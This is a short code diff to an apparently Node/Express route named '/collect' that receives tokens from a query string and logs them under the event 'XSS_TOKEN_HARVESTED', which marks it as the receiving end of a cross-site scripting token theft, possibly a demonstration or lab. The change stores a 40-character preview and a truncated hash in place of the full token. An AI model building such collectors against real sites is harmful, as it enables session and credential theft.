@@ -24,12 +24,14 @@ let collectedTokens = [];
 router.get('/collect', (req, res) => {
   const { token } = req.query;
   if (token && token !== 'null') {
-    collectedTokens.unshift({
-      token:     token.substring(0, 50) + '...',
-      fullToken: token,
-      timestamp: new Date().toISOString(),
-      ip:        req.ip,
-    });
+    collectedTokens.unshift(
+      {
+        tokenPreview: token.substring(0, 40) + '...',
+        tokenHash:    crypto.createHash('sha256').update(token).digest('hex').substring(0, 16),
+        timestamp: new Date().toISOString(),
+        ip: req.ip,
+      }
+    );
     if (collectedTokens.length > 50) collectedTokens = collectedTokens.slice(0, 50);
     writeLog({
       event:        'XSS_TOKEN_HARVESTED',
